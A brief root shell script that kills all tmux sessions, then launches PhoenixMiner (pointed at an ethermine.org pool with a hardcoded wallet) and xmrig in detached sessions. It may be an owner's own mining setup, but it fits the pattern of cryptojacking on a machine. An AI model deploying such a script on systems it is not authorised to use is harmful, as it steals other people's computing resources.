#!/bin/sh
cd /root
tmux kill-server
sleep 1
sudo tmux new-session -d -s SANS1 './PhoenixMiner_5.6d_Linux/PhoenixMiner -pool eu1.ethermine.org:4444 -wal 0x50167235D2b995DEdc2f2d28Cd1cD184D97f1aba.Image -pass x'
sudo tmux new-session -d -s SANS2 './xmrig-v5.11.1/xmrig'
